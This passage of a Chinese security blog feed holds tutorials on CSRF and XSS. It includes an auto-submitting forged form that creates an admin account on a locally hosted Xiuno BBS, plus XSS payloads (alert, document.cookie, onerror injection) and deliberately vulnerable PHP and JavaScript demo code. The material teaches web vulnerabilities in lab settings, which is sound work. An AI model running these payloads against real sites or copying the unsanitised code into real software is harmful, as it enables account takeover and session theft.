/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Type"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Title"</span> <span class="attr">value</span>=<span class="string">"CSRF"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Alias"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Tag"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Intro"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"CateID"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Status"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Template"</span> <span class="attr">value</span>=<span class="string">"single"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"AuthorID"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PostTime"</span> <span class="attr">value</span>=<span class="string">"2019&amp;#45;06&amp;#45;04&amp;#32;18&amp;#58;54&amp;#58;32"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"IsTop"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"IsLock"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Intro"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Content"</span> <span class="attr">value</span>=<span class="string">"This&amp;#32;a&amp;#32;csrf&amp;#32;ariticle&amp;lt;br&amp;#47;&amp;gt;&amp;lt;p&amp;gt;&amp;lt;br&amp;#47;&amp;gt; &amp;lt;&amp;#47;p&amp;gt;"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是Zblog发布⽂章的⼀个数据包⽣成的CSRF表单，点击Copy HTML将这个⽂件放到HTML⽂件中去访 问，效果如下:</p><p><img src="http://qiniuyun.lintstar.top/20200804230545.png" alt="20200804230545"></p><p>受害者必须点击这个按钮才可以触发构造好的表单内容，这⼀点对于真实的钓⻥是⼀件很不友好的事 情，所以我们得在Burpsuite的基础上⼆次修改表单，让管理员访问这个⻚⾯的时候直接就可以触发 这个精⼼构造好的表单。</p><p>实际上只需要⼀⾏JavaScript代码即可实现这个效果:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> document.forms[0].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有了这个⾃动提交表单，可以把按钮元素直接删掉，这样可以更隐⾼效地攻击，删掉如下内容：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这样当管理员访问这个这个HTML⽂件的时候，⻚⾯加载完就会⾃动提交表单，⼀瞬间就可以触发.</p><h1 id="CSRF实战"><a href="#CSRF实战" class="headerlink" title="CSRF实战"></a>CSRF实战</h1><p><a href="https://bbs.xiuno.com/" target="_blank" rel="noopener">https://bbs.xiuno.com/</a></p><p>Xiuno BBS 4.0 是⼀款轻论坛产品，前端基于 BootStrap 4.0、JQuery 3，后端基于 PHP/7 MySQL XCache/Yac/Redis/Memcached…，⾃适应⼿机、平板、PC，有着⾮常⽅便的插件机制，不仅仅是⼀个 轻论坛，还是⼀个良好的⼆次开发平台。</p><p><img src="http://qiniuyun.lintstar.top/image-20200804193505204.png" alt="image-20200804193505204"></p><p>首先本地搭好这个cms:</p><p><img src="http://qiniuyun.lintstar.top/image-20200804193259369.png" alt="image-20200804193259369"></p><p>登录管理员账号访问并创建账户：</p><p><img src="http://qiniuyun.lintstar.top/20200804231324.png" alt="20200804231324"></p><p>bp抓包做poc:</p><p><img src="http://qiniuyun.lintstar.top/image-20200804193938458.png" alt="image-20200804193938458"></p><p>名为csrf.html放到本地网站根目录</p><p>把action后面修改成目标网站：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://10.20.24.244:8089/admin/?user-create.htm"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"wfb&amp;#64;qq&amp;#46;com"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"wfb"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"wfb"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"&amp;#95;gid"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> document.forms[0].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注册账号登录目标网站，发表文章等待管理员点击链接：</p><p><img src="http://qiniuyun.lintstar.top/image-20200804193024044.png" alt="image-20200804193024044"></p><p>创建成功，使用之前抓包时的账号密码登录后台：</p><p><img src="http://qiniuyun.lintstar.top/image-20200804193223518.png" alt="image-20200804193223518"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CSRF跨站请求伪造&quot;&gt;&lt;a href=&quot;#CSRF跨站请求伪造&quot; class=&quot;headerlink&quot; title=&quot;CSRF跨站请求伪造&quot;&gt;&lt;/a&gt;CSRF跨站请求伪造&lt;/h1&gt;&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;head
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined06/db4b83e4.html</id>
    <published>2020-08-06T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:18.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。</p><p>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p><p>XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下:</p><ol><li>Web浏览器本身的设计不安全，无法判断JS代码是否是恶意的</li><li>输入与输出的Web应用程序基本交互防护不够</li><li>程序员缺乏安全意识，缺少对XSS漏洞的认知</li><li>XSS触发简单，完全防御起来相当困难</li></ol><h2 id="XSS跨站脚本实例"><a href="#XSS跨站脚本实例" class="headerlink" title="XSS跨站脚本实例"></a>XSS跨站脚本实例</h2><p>下面的HTML代码就演示了一个最基本的XSS弹窗：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("XSS")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>/</code> 正斜杠也可以弹窗</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>弹cooike</p></blockquote><p>该代码直接再HTML页面通过<code>&lt;script&gt;</code>标签来执行了javaScript内置的alert()函数，达到弹出消息框弹窗的效果：</p><p><img src="http://qiniuyun.lintstar.top/1555333317665.png" alt="1555333317665"></p><p>XSS攻击就是将非法的JavaScript代码注入到用户浏览的网页上执行，而Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码本身是否对用户有害。</p><h2 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h2><p>诚然，XSS可能不如SQL注射、文件上传等能够直接得到较高操作权限的漏洞，但是它的运用十分灵活（这使它成为最深受黑客喜爱的攻击技术之一），只要开拓思维，适当结合其他技术一起运用，XSS的威力还是很大的。可能会给网站和用户带来的危害简单概括如下：</p><ol><li>网络钓鱼</li><li>盗取用户cookies信息</li><li>劫持用户浏览器</li><li>强制弹出广告页面、刷流量</li><li>网页挂马</li><li>进行恶意操作，例如任意篡改页面信息</li><li>获取客户端隐私信息</li><li>控制受害者机器向其他网站发起攻击</li><li>结合其他漏洞，如CSRF漏洞，实施进一步作恶</li><li>提升用户权限，包括进一步渗透网站</li><li>传播跨站脚本蠕虫等</li></ol><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XSS（非持久型）"><a href="#反射型XSS（非持久型）" class="headerlink" title="反射型XSS（非持久型）"></a>反射型XSS（非持久型）</h2><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p><p>假设一个页面把用户输入的参数直接输出到页面上：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input = $_GET[<span class="string">'param'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$input.<span class="string">"&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户向<code>param</code>提交的数据会展示到<code>&lt;h1&gt;</code>的标签中展示出来，比如提交:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?param=Hello XSS</span><br></pre></td></tr></table></figure><p>会得到如下结果:</p><p><img src="http://qiniuyun.lintstar.top/1578577230860.jpg" alt="1578577230860"></p><p>此时查看页面源代码，可以看到：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时如果提交一个JavaScript代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>会发现，<code>alert(233)</code>在当前页面执行了：</p><p><img src="http://qiniuyun.lintstar.top/1578577808625.jpg" alt="1578577808625"></p><p>再查看源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(233)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持久型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p><h2 id="存储XSS（持久型）"><a href="#存储XSS（持久型）" class="headerlink" title="存储XSS（持久型）"></a>存储XSS（持久型）</h2><p>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。</p><p>为了复现存储型XSS，这里我们得用到数据库，本地新建一个名字叫做<code>xss</code>的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是<code>id</code>、<code>username</code>、<code>message</code></p><p><img src="http://qiniuyun.lintstar.top/1555378624885.png" alt="1555378624885"></p><p><code>id</code>设为主键，并勾选<strong>自动递增</strong> ，也可以参考下面的<code>sql</code>语句来设计表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `message`;</span><br><span class="line">CREATE TABLE `message`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  `message` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure><p>目前数据库方面设计完了，开始着手写<code>PHP</code>后端页面，来复现一下存储型XSS漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/*数据库信息配置*/</span><br><span class="line">$host = &quot;localhost&quot;; //数据库地址</span><br><span class="line">$port = &quot;3306&quot;; //数据库端口</span><br><span class="line">$user = &quot;root&quot;; //数据库用户名</span><br><span class="line">$pwd = &quot;root&quot;; //数据库密码</span><br><span class="line">$dbname = &quot;xss&quot;; //数据库名</span><br><span class="line">$conn = new mysqli($host,$user,$pwd,$dbname,$port);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form  method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    /*直接将留言插入到数据库中*/</span><br><span class="line">    $username=$_POST[&apos;username&apos;];</span><br><span class="line">    $message=$_POST[&apos;message&apos;];</span><br><span class="line">    if($username and $message)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&apos;&#123;$username&#125;&apos;,&apos;&#123;$message&#125;&apos;)&quot;;</span><br><span class="line">        if ($conn-&gt;query($sql) === TRUE) &#123;</span><br><span class="line">            echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*查询数据库中的留言信息*/</span><br><span class="line">    $sql = &quot;SELECT username, message FROM message&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">        while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">            echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;暂无留言&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p><p><img src="http://qiniuyun.lintstar.top/20200809130101.png" alt="20200809130101"></p><p>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了<code>html</code>网页中，这样就很容易导致存储型<code>XSS</code>漏洞的产生。</p><p>当攻击者直接在留言板块插入<code>&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;</code>，会导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗，除非从数据库中删除这条语句：</p><p><img src="http://qiniuyun.lintstar.top/20200809130716.png" alt="20200809130716"></p><p>此时查看下网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">b</span>&gt;</span>蔡徐坤   <span class="tag">&lt;<span class="name">b</span>&gt;</span>留言内容:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('鸡你太美')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为<code>http://127.0.0.1/test.php</code>，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><blockquote><p>持久：只要不清除数据库数据，每次访问就会一直弹窗</p></blockquote><h2 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h2><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><p>下面编写一个简单的含有DOM XSS漏洞的HTML代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    function xss()&#123;</span></span><br><span class="line"><span class="undefined">        var str = document.getElementById("src").value;</span></span><br><span class="line"><span class="xml">        document.getElementById("demo").innerHTML = "<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'"+str+"'</span> /&gt;</span>";</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"src"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">placeholder</span>=<span class="string">"输入图片地址"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"插入"</span> <span class="attr">onclick</span>=<span class="string">"xss()"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>功能很简单，用户输入框插入图片地址后，页面会通过<code>&lt;img&gt;</code>标签将插入的图片显示在网页上：</p><p><img src="http://qiniuyun.lintstar.top/20200804104046.png" alt="20200804104046"></p><p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; onerror=alert(233)//&apos;</span><br><span class="line"></span><br><span class="line">x&apos; onerror=alert(233) x=&apos;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200804103859.png" alt="20200804103859"></p><p>会直接在<code>&lt;img&gt;</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的alert()函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。</p><h1 id="XSS靶场搭建"><a href="#XSS靶场搭建" class="headerlink" title="XSS靶场搭建"></a>XSS靶场搭建</h1><p>本节主要是搭建一些靶场，因为大家都是搞信息安全的，所以靶场搭建的话我这里就不重复造轮子，通过搜索引擎可以找到很多图文并茂的教程，所以本节里面只做概括的作用。</p><h2 id="Web-For-Pentester"><a href="#Web-For-Pentester" class="headerlink" title="Web For Pentester"></a>Web For Pentester</h2><p><strong>官网</strong>：<a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></p><p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p><strong>官网</strong>：<a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></p><p><strong>下载地址</strong>：<a href="https://github.com/ethicalhack3r/DVWA/archive/master.zip" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA/archive/master.zip</a></p><p><strong>安装方法</strong>：将<code>/config/config.inc.php.dist</code>文件重命名为<code>/config/config.inc.php</code> ，本地新建一个名字叫做<code>dvwa</code>的数据库，根据本地实际环境的信息，修改配置文件信息如下：（填写key这里是可选的操作）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_user'</span> ]     = <span class="string">'root'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_password'</span> ] = <span 